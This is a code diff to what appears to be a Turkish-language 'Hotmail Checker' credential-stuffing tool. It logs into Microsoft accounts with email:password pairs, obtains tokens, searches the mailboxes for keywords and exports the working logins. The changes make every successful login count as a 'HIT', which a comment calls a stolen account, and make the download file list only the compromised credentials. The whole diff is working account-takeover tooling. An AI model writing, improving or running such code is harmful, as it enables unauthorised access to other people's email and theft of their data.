@@ -303,10 +303,11 @@ class HotmailChecker:
       if self.exchange_code_for_tokens():
         self.refresh_substrate_token()
         matches = self.search_keywords() if self.keywords else {}
-        if matches:
-          return "HIT", self.captures, matches
-        else:
-          return "FREE", self.captures, {}
+
+        # DÜZELTME: Eğer giriş başarılı ve token alındıysa,
+        # keyword girilmiş olsun ya da olmasın hesap çalıntıdır (HIT) sayılmalıdır.
+        return "HIT", self.captures, matches
+
       return "FREE", self.captures, {}
     except LoginError as le:
       return str(le), {}, {}
@@ -404,7 +405,12 @@ elif menu == "✉️ Hotmail Checker":
           checker = HotmailChecker(email, password, keywords)
           status, captures, matches = checker.run()
           if status == "HIT":
-            hits.append((email, password, str(matches)))
+            match_str = (
+                str(matches)
+                if matches
+                else "Eşleşen Keyword Yok / Direkt Giriş"
+            )
+            hits.append((email, password, match_str))
           elif status == "FREE":
             frees.append((email, password, "Boş / Serbest"))
           else:
@@ -429,12 +435,12 @@ elif menu == "✉️ Hotmail Checker":
       st.dataframe(df, use_container_width=True)
 
       hit_text = "\n".join(
-          [f"{r[0]}:{r[1]} ({r[2]})" for r in all_results if r in hits or r in frees]
+          [f"{r[0]}:{r[1]} ({r[2]})" for r in all_results if r in hits]
       )
       st.download_button(
-          "📋 Sonuçları İndir (TXT)",
+          "📋 Hit Hesapları İndir (TXT)",
           hit_text,
-          file_name="devildev_results.txt",
+          file_name="devildev_hits.txt",
           mime="text/plain",
       )
 
